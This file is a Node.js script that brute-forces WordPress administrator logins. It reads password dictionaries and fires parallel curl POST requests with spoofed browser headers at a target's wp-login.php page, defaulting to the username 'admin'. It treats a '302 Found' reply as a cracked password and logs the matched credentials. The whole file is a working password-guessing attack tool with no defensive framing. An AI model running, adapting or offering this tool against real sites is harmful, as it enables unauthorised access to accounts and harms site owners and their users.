#!/usr/bin/env node


var fs = require('fs')
,split = require('split')
,path = require('path')
,through = require('through')
,sext = require('sext')
,argv = require('minimist')(process.argv.slice(2))
,ut = require('./ut')
,logger = require('./logger')
,config = require('./config')
,matchKey = 'Match!'
,verbose = !!argv.v
,intervalSeconds = argv.s ? +argv.s : null
,host = argv.h || ''
,loginPath = argv.p || '/wp-login.php'
,user = encodeURIComponent(argv.u || 'admin')
,quitOnFind = !!argv.r
,logDir = config.logDir ? config.logDir : __dirname+'/logs/'
,maxCmdThreads = argv.t ? +argv.t : config.maxCmdThreads
,dictFile = argv.d || __dirname+'/dict.example'
,dictDir
,checked = {}
,statsInterval = null
,stats = {
	attempts: 0
	,attemptsCompleted: 0
	,attemptErrors: 0
	,filesOpened: 0
	,filesRead: 0
	,dups: 0
	,timeStart: null
	,timeEnd: null
	,matches: []
}
,configDisplay = ['host: '+host, 'loginPath: '+loginPath, 'user: '+user, 'dictFile: '+dictFile, 'verbose: '+verbose, 'intervalSeconds: '+intervalSeconds, 'logDir: '+logDir, 'quitOnFind: '+quitOnFind, 'maxCmdThreads: '+maxCmdThreads, 'config: '+JSON.stringify(config)]
;
console.log(configDisplay.join('\n'),'\n');

stats.timeStart = new Date;
startStatsInterval(intervalSeconds);
logger.create(logDir, ut.prettyTime(stats.timeStart), configDisplay.join('\n'));
//handleProcessErrors();


fs.stat(dictFile,function(err,stat){
	if (err)
		return console.log('Error reading dict', err);
	var files;
	if (stat.isDirectory()){
		dictDir = path.normalize(dictFile);
		try {
			files = fs.readdirSync(dictFile);
			files.forEach(function(file,i){
				files[i] = dictDir+'/'+file;
			});
		} catch (e) {
			return console.log('Error reading dir', e);
		}
	} else if (stat.isFile()) {
		dictDir = path.dirname(dictFile);
		files = [dictFile];
	} else {
		return console.log('Dict path is not a file or directory');
	}
	through(checkDicts).on('attemptReceived',function(err,data, stdOut, stdErr){
		if (err) {
			console.log('Attempt Error', err);
			// console.log('\nstdOut\n'+stdOut, '\nstdErr\n'+stdErr);
		}
		if (data && quitOnFind) {
			showResults();
		}
	}).on('fileRead',function(err,data){
		if (err)
			console.log('File Read Error', err);
	}).on('end',showResults).write(files);
});

function handleProcessErrors(){
	process.on('SIGINT',showResults);
	process.on('uncaughtException',showResults);
}

function prettifyStats(){
	var cpy = sext({},stats);
	if (cpy.timeStart)
		cpy.timeStart = ut.prettyTime(cpy.timeStart);
	if (cpy.timeEnd)
		cpy.timeEnd = ut.prettyTime(cpy.timeEnd);
	return '\n\n----------------------------\n\n'
		+ ut.prettyTime()+'\n\n'
		+ JSON.stringify(cpy)+'\n\n'
		+ (stats.attemptErrors
			? 'Retry the '+stats.attemptErrors+' failed attempts by running:\n'
				+ makeReRunFailedAttemptsCmd()
			: '')
		+ '\n\n----------------------------\n\n'
	;
}

function makeReRunFailedAttemptsCmd(){
	var logPath = logger.getPath('failed');
	if (!logPath)
		return null;
	return process.argv.join(' ').replace(dictFile,logPath);
}

function showResults(err){
	stopStatsInterval();
	err
		? console.log('\n------------ Error! ------------\n',err)
		: console.log('\n------------ El Fin ------------\n')
	;
	if (err) {
		if (err.message && err.name && err.stack)
				throw err;
		console.log('ERR',err);
	}
	var pretty = prettifyStats();
	console.log(pretty);
	logger.update(pretty);
	process.kill();
}

function startStatsInterval(secs){
	var ms = secs * 1000;
	stopStatsInterval();
	statsInterval = setTimeout(function(){
		var pretty = prettifyStats();
		if (verbose)
			console.log(pretty);
		logger.update(pretty);
		startStatsInterval(secs);
	},ms);
}

function stopStatsInterval(){
	if (statsInterval === null)
		return;
	clearTimeout(statsInterval);
	statsInterval = null;
}

function checkDicts(files){
	var z = this
	,filesFinished = 0
	,attempts = 0
	,attemptsReceived = 0
	,activeCmds = 0
	,streams = []
	,cmdQueue = []
	,matches = []
	;
	files.forEach(function(file,fileIndex){
		++stats.filesOpened;
		streams[streams.length-1] = fs.createReadStream(file).pipe(split()).on('data',function(pass){
			//console.log(pass);
			if (checked[pass]) {
				++stats.dups;
				return z.emit('attemptReceived');
			}
			checked[pass] = true;
			++stats.attempts;
			++attempts;
			queueCmd(pass);
			streams[fileIndex] = this;
			if (cmdQueue.length > config.maxLinesReadAhead)
				this.pause();
		}).on('error',fileFinished).on('close',fileFinished);
		function fileFinished(err){
			++filesFinished;
			if (!err)
				++stats.filesRead;
			z.emit('fileRead',err,file);
		}
		function queueCmd(pass){
			if (activeCmds < maxCmdThreads)
				return runCmd(pass);
			cmdQueue.push({pass:pass});
		}
		function runCmd(pass){
			++activeCmds;
			checkAuth(user, pass, function(err,match,stdOut,stdErr){
				++attemptsReceived;
				if (!err) {
					++stats.attemptsCompleted;
					if (match) {
						matches.push(match);
						stats.matches.push(match);
					}
				} else {
					++stats.attemptErrors;
					logger.addErroredAttempt(pass);
				}
				z.emit('attemptReceived',err,match,stdOut,stdErr);
				console.log(attemptsReceived,attempts);
				if (attemptsReceived == attempts)
					return z.emit('end',false,matches);
				--activeCmds;
				if (cmdQueue.length) {
					var cmd = cmdQueue.shift();
					runCmd(cmd.pass);
					if (cmdQueue.length <= config.maxLinesReadAhead) {
						streams.forEach(function(stream){
							stream.resume();
						});
					}
				}
			});
		}
	});
	function pauseStreams(){
		if (streamsPaused)
			return;
		streamsPaused = true;
		console.log('PAUSING');
		streams.forEach(function(stream){
			stream.pause();
		});
	}
	function resumeStreams(){
		if (!streamsPaused)
			return;
		streamsPaused = false;
		console.log('RESUMING');
		streams.forEach(function(stream){
			stream.resume();
		});
	}
}

function checkAuth(user,pass,cb){
	// config.curl+" -v '"+host+loginPath+"' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' -H 'Origin: "+host+"' -H 'Accept-Encoding: gzip,deflate,sdch' -H 'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: "+host+loginPath+"' -H 'Connection: keep-alive' --data 'log="+user+"&pwd=%PASS%&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1' --compressed 2>&1" //  2>&1 /dev/null
	//if (verbose) console.log('Check: '+user+'/'+pass);
	var cmd = 'curl'//config.curl
	,args = ['-v',host+loginPath
	,'-H',"Cookie: wordpress_test_cookie=WP+Cookie+check"
	,'-H',"Origin: "+host
	,'-H',"Accept-Encoding: gzip,deflate,sdch'"
	,'-H',"Accept-Language: en-US,en;q=0.8"
	,'-H',"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
	,'-H',"Content-Type: application/x-www-form-urlencoded"
	,'-H',"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	,'-H',"Cache-Control: max-age=0"
	,'-H',"Referer: "+host+loginPath
	,'-H',"Connection: keep-alive"
	,'--data',"log="+user+"&pwd="+encodeURIComponent(pass)+"&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1"
	,'--compressed'
	];
	// can make faster by killing the process after stdErr is done
	ut.spawn(cmd,args,function(err,stdOut,stdErr){
		var match = null;
		//console.log('stdErr', stdErr);
		if (!err && stdErr.indexOf('302 Found') != -1) {
			match = {
				user: user
				,pass: pass
			};
			if (verbose) console.log(matchKey,'  ',match);
		}
		cb(err,match,stdOut,stdErr);
	});
}



